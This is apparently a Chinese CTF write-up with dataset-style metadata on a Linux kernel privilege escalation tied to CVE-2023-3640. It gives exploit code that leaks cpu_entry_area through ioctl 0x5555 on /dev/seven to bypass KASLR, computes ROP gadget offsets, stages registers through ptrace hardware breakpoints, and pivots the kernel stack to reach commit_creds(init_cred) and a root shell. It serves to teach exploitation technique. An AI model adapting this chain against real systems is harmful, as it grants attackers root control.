---
title: 基于cpu_entry_area利用的Linux内核权限提升
contest: CVE-2023-3640 内核提权
year: 2024
difficulty: hard
vuln_type: heap_exploit
tags: [Linux内核提权, cpu_entry_area, KASLR绕过, 内核栈迁移, 硬件断点, ROP, ioctl 0x5555/0x6666, ptrace, CVE-2023-3640]
attack_chain:
  - 漏洞: ioctl 0x5555 泄内核地址 / ioctl 0x6666 改内核栈迁移
  - cpu_entry_area 概要: 泄露内容得内核 text 段地址 → 偏移得内核基址, 绕 KASLR
  - 步骤 1: ioctl(fd, 0x5555, 0xfffffe0000000000+4) 泄地址 addr
  - 步骤 2: kernel_base = addr - 0x1008e00
  - 步骤 3: 算 init_cred/commit_cred/pop_rdi/swapgs 偏移
  - init_cred = kernel_base + 0xbd64cbf8 - 0xbbc00000
  - commit_cred = kernel_base + 0xbbcbb5b0 - 0xbbc00000
  - pop_rdi = kernel_base + 0x81002c9d - 0x81000000
  - swapgs_restore_regs_and_return_to_usermode = kernel_base + 0x82000f01 - 0x81000000
  - 步骤 4: 父进程 fork 子进程 + PTRACE_TRACEME + SIGSTOP
  - 步骤 5: PTRACE_POKEUSER 设 dr0 = mmap(0x0a000000) 硬件断点
  - 步骤 6: PTRACE_POKEUSER 设 dr7 = 0xf0101 (本地写断点+启用)
  - 步骤 7: PTRACE_CONT 触发断点, CPU 寄存器写到 mmap 区域
  - 步骤 8: 寄存器填 r13=init_cred, r12=commit_cred, rbp=swapgs, r10=getshell
  - 步骤 9: 子进程 mov rdi, [rsi] 触发硬件断点, 走 ROP → getRootShell
  - 步骤 10: ioctl(fd, 0x6666, 0xfffffe0000010f60) 改内核栈迁移地址
key_payload: 'ioctl 0x5555 泄 + 0x6666 栈迁移 + ptrace dr0+dr7 硬件断点 + 寄存器填 ROP'
one_liner: CVE-2023-3640 cpu_entry_area 内核提权: ioctl 泄基址 + ptrace 硬件断点抓寄存器 + 寄存器填 ROP 提权。
lesson: cpu_entry_area 是 Linux 内核 KASLR 旁路经典, 泄露内容得内核 text 段偏移; ptrace dr0/dr7 硬件断点 + PTRACE_CONT 抓寄存器值; 寄存器填 ROP 走 commit_creds(init_cred) + swapgs 返用户态。
quality: high
---

# 基于cpu_entry_area利用的Linux内核权限提升

## 概览
- **来源**: ctfiot 174565
- **题目**: CVE-2023-3640 内核提权
- **难度**: ⭐⭐⭐⭐⭐

## cpu_entry_area 概要
- 泄露内容 → 内核 text 段地址
- 偏移计算 → 内核基址, 绕 KASLR
- 也可构造 ROP

## 攻击链

### 1. 信息泄露
```c
int fd = open("/dev/seven", O_RDWR);
unsigned long addr = ioctl(fd, 0x5555, 0xfffffe0000000000 + 4);
printf("0x%llx\n", addr - 0x1008e00);
kernel_base = addr - 0x1008e00;
```

### 2. 关键地址计算
```c
init_cred = kernel_base + 0xbd64cbf8 - 0xbbc00000;
commit_cred = kernel_base + 0xbbcbb5b0 - 0xbbc00000;
pop_rdi = kernel_base + 0x81002c9d - 0x81000000;
swapgs_restore_regs_and_return_to_usermode = kernel_base + 0x82000f01 - 0x81000000;
```

### 3. 父子进程 + 硬件断点
```c
map = mmap((void*)0x0a000000, 0x1000000, PROT_READ|PROT_WRITE,
           MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
hbp_pid = fork();
if (child) {
    sched_setaffinity(0, sizeof(mask), &mask);  // 绑单核
    ptrace(PTRACE_TRACEME, 0, NULL, NULL);
    raise(SIGSTOP);
    // 寄存器填 ROP 参数
    __asm__(
        "mov r15, 0xbeefdead;"
        "mov r14, pop_rdi;"
        "mov r13, init_cred;"       // commit_creds 第一个参数
        "mov r12, commit_cred;"     // 提交权限
        "mov rbp, swapgs_restore_regs_and_return_to_usermode;"
        "mov r10, getshelladdr;"   // 返用户态 getRootShell
        "mov r9, user_cs;"
        "mov r8, user_rflags;"
        "mov rax, user_sp;"
        "mov rcx, user_ss;"
        "mov rsi, 0xa000000;"
        "mov rdi, [rsi];"           // 触发硬件断点
    );
}
if (parent) {
    ptrace(PTRACE_POKEUSER, hbp_pid, offsetof(user, u_debugreg), map);
    ptrace(PTRACE_POKEUSER, hbp_pid, offsetof(user, u_debugreg) + 56, 0xf0101);
    // dr0=map, dr7=本地写断点+启用
}
```

### 4. 触发栈迁移
```c
hbp_raw_fire();  // PTRACE_CONT 触发断点
waitpid(hbp_pid, NULL, __WALL);
hbp_raw_fire();
waitpid(hbp_pid, NULL, __WALL);
ioctl(fd, 0x6666, 0xfffffe0000010f60);  // 改内核栈到 cpu_entry_area
```

## 关键点
- `ioctl(fd, 0x5555, ...)` 泄 cpu_entry_area 内容
- `ioctl(fd, 0x6666, ...)` 触发内核栈迁移
- ptrace dr0+dr7 硬件断点
- 寄存器值 (r13=init_cred, r12=commit_cred) 走标准 ROP
- swapgs 返用户态 getRootShell

## CVE-2023-3640 参考
- https://nvd.nist.gov/vuln/detail/CVE-2023-3640
- https://github.com/pray77/CVE-2023-3640

## 教学
- cpu_entry_area 是 KASLR 旁路: 内容泄露得内核 text 段
- ptrace PTRACE_POKEUSER 设 dr0/dr7 是硬件断点标准
- 寄存器值直接作 ROP 参数: r13=init_cred, r12=commit_cred
- swapgs_restore_regs_and_return_to_usermode 是返用户态 ROP gadget
